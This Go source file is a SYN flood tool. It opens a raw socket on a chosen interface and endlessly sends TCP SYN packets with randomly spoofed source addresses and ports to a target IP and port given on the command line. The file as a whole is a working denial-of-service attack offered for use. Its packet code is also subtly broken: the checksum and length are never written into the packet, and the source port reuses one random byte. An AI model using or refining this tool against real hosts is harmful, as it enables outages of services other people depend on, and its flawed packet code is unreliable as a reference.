package main

import (
	"crypto/rand"
	"flag"
	"fmt"
	"reflect"
	"strconv"
	"strings"
	"syscall"
	//"time"
)

type SYNPacket struct {
	Payload   []byte
	TCPLength uint16
	Adapter   string
}

type TCP_IP struct {
	VersionIHL    byte
	TOS           byte
	TotalLen      uint16
	ID            uint16
	FlagsFrag     uint16
	TTL           byte
	Protocol      byte
	IPChecksum    uint16
	SRC           []byte
	DST           []byte
	SrcPort       uint16
	DstPort       uint16
	Sequence      []byte
	AckNo         []byte
	Offset        uint16
	Window        uint16
	TCPChecksum   uint16
	UrgentPointer uint16
	Options       []byte
	SYNPacket     `key:"SYNPacket"`
}

func getPacket(dst []byte, dstPort uint16) *TCP_IP {
	packet := &TCP_IP{
		VersionIHL:    0x45,
		TOS:           0x00,
		ID:            0x0000,
		FlagsFrag:     0x0000,
		TTL:           0x40,
		Protocol:      0x06,
		IPChecksum:    0x0000,
		SRC:           make([]byte, 4),
		SrcPort:       0x0000,
		DST:           dst,
		DstPort:       dstPort,
		Sequence:      make([]byte, 4),
		AckNo:         make([]byte, 4),
		Offset:        0x5002, // check
		Window:        0x7110, // check
		UrgentPointer: 0x0000,
		Options:       make([]byte, 12),
	}

	rand.Read(packet.SRC)

	for packet.SrcPort < 1024 {
		ps := make([]byte, 2)
		rand.Read(ps)
		packet.SrcPort = (uint16)(ps[0])<<8 + (uint16)(ps[0])
	}

	t := reflect.TypeOf(packet).Elem()
	v := reflect.ValueOf(packet).Elem()

	packet.SYNPacket.Payload = make([]byte, 60)
	var payloadIndex int = 0
	for i := 0; i < t.NumField(); i++ {
		field := t.Field(i)
		alias, _ := field.Tag.Lookup("key")
		if len(alias) < 1 {
			key := v.Field(i).Interface()
			keyType := reflect.TypeOf(key).Kind()
			switch keyType {
			case reflect.Uint8:
				packet.SYNPacket.Payload[payloadIndex] = key.(uint8)
				payloadIndex++
			case reflect.Uint16:
				packet.SYNPacket.Payload[payloadIndex] = (uint8)(key.(uint16) >> 8)
				payloadIndex++
				packet.SYNPacket.Payload[payloadIndex] = (uint8)(key.(uint16) & 0x00FF)
				payloadIndex++
			default:
				for _, element := range key.([]uint8) {
					packet.SYNPacket.Payload[payloadIndex] = element
					payloadIndex++
				}
			}
		}
	}

	packet.TCPLength = (uint16)(len(packet.SYNPacket.Payload) + 20)

	packet.TotalLen = (uint16)(len(packet.SYNPacket.Payload) + 20)
	packet.checksum()

	return packet
}

func (tcp *TCP_IP) checksum() {
	var checksum uint32 = 0
	checksum = (uint32)((uint32)(tcp.SRC[0])<<8) + (uint32)(tcp.SRC[1])
	checksum += (uint32)((uint32)(tcp.SRC[2])<<8) + (uint32)(tcp.SRC[3])
	checksum += (uint32)((uint32)(tcp.DST[0])<<8) + (uint32)(tcp.DST[1])
	checksum += (uint32)((uint32)(tcp.DST[2])<<8) + (uint32)(tcp.DST[3])
	checksum += uint32(tcp.SrcPort)
	checksum += uint32(tcp.DstPort)
	checksum += uint32(tcp.Protocol)
	checksum += uint32(tcp.TCPLength)
	checksum += uint32(tcp.Offset)
	checksum += uint32(tcp.Window)

	carryOver := checksum >> 16
	tcp.TCPChecksum = 0xFFFF - (uint16)((checksum<<4)>>4+carryOver)

}

func sendPacket(fd int, packet *TCP_IP, addr syscall.SockaddrInet4) {
	err := syscall.Sendto(fd, packet.SYNPacket.Payload, 0, &addr)
	if err != nil {
		panic("Failed to send packet: " + err.Error())
	}
	fmt.Printf("%d.%d.%d.%d:%d -> %d.%d.%d.%d:%d\n", packet.SRC[0], packet.SRC[1], packet.SRC[2], packet.SRC[3], packet.SrcPort, packet.DST[0], packet.DST[1], packet.DST[2], packet.DST[3], packet.DstPort)
}

func main() {
	target := flag.String("t", "", "Target IP address")
	port := flag.Uint("p", 80, "Target port")
	inter := flag.String("i", "", "Interface")
	flag.Parse()

	if *target == "" || *port == 0 || strings.Count(*target, ".") != 3 || *port > 65535 || *port < 1 || *inter == "" {
		flag.PrintDefaults()
		return
	}

	dst := make([]byte, 4)
	for i, v := range strings.Split(*target, ".") {
		b, err := strconv.Atoi(v)
		if err != nil || b < 0 || b > 255 {
			flag.PrintDefaults()
			return
		}
		dst[i] = (uint8)(b)
	}

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		panic("Failed to create socket: " + err.Error())
	}
	err = syscall.BindToDevice(fd, *inter)
	if err != nil {
		panic("Failed to bind to device: " + err.Error())
	}

	for {
		p := getPacket(dst, uint16(*port))
		addr := syscall.SockaddrInet4{Port: int(p.DstPort), Addr: [4]byte(p.DST)}
		sendPacket(fd, p, addr)
		//time.Sleep(1 * time.Second)
	}

}
